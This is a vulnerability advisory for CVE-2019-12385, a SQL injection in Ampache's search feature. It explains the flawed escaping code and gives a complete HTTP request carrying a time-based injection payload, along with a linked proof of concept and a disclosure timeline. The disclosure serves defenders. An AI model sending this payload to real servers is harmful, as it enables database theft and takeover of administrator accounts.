# CVE-2019-12385: SQL injection in Ampache
## Software
[![](https://img.shields.io/badge/Attack%20Vector-Remote-red?style=flat-square)]() [![](https://img.shields.io/badge/Privileges%20Required-Low-yellow?style=flat-square)]() [![](https://img.shields.io/badge/User%20Interaction-No-red?style=flat-square)]()

__Vendor:__ Ampache<br>
__Vendor URL:__ http://ampache.org<br>
__Versions affected:__ Ampache <= 3.9.1<br>
__Discovered by:__ Pablo Martinez ([@xassiz](https://twitter.com/xassiz))<br>
__Public fix:__ Yes<br>
__Proof of Concept:__ Yes ([ref](https://github.com/blackarrowsec/advisories/blob/master/2019/CVE-2019-12385/CVE-2019-12385.py)) <br>



## Summary
The search engine is affected by a SQL Injection, so any user able to perform lib/class/search.class.php searches (even guest users) can dump any data contained in the database (sessions, hashed passwords, etc.). 

## Details
Communication with the database is made via the Dba class (ORM), which relays on PHP PDO to perform queries. Some of them are performed properly using prepared statements, but in other cases the Dba::escape method is used.

lib/class/dba.class.php:

```php
134:    public static function escape($var)
135:    {
136:        $dbh = self::dbh();
137:        if (!$dbh) {
138:            debug_event('Dba', 'Wrong dbh.', 1);
139:            exit;
140:        }
141:        $var = $dbh->quote($var);
142:        // This is slightly less ugly than it was, but still ugly
143:        return substr($var, 1, -1);
144:    }
```

This function calls PDO::quote, which filters special characters and quotes the string. After that, outer single quotes are stripped. The latter means that if this value is not quoted within the query, an attacker could inject data in SQL context.

A vulnerable case supporting this theory is detailed below, although there could be more.

lib/class/search.class.php:

```php
1461:   case 'last_play':
1462:          $userid               = $GLOBALS['user']->id;
1463:          $where[]              = "`object_count`.`date` IS NOT NULL AND `object_count`.`date` $sql_match_operator (UNIX_TIMESTAMP() - ($input * 86400))";
1464:          $join['object_count'] = true;
1465:          break;
```
The $input variable is basically:
```
Dba::escape($USER_INPUT)
``` 

So a malicious user could provide SQL commands (avoiding quotes and other special chars). The next request confirms the vulnerability, causing a 5-seconds delay:

```
POST /search.php?type=song
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en;q=0.8,pt;q=0.7
Cookie: ampache=[session_id]
Connection: close
        
limit=0&operator=or&rule_1=last_play&rule_1_operator=1&rule_1_input=1))union+select+1+from+dual+where+sleep(5)--&action=search
```


## Impact
This vulnerability may lead to a full compromise of admin accounts, when combined with the weak password generator algorithm used in the lostpassword functionality.

## Recommendation
Update to last version.

## Timeline

* 25/04/2019 - Reported vulnerability to vendor
* 24/06/2019 - First fix attempt
* 25/06/2019 - Incorrect fix notification
* 25/06/2019 - Final fix at Github

#

[![](https://img.shields.io/badge/www-blackarrow.net-E5A505?style=flat-square)](https://www.blackarrow.net) [![](https://img.shields.io/badge/twitter-@BlackArrowSec-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/BlackArrowSec) [![](https://img.shields.io/badge/linkedin-@BlackArrowSec-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/blackarrowsec/)

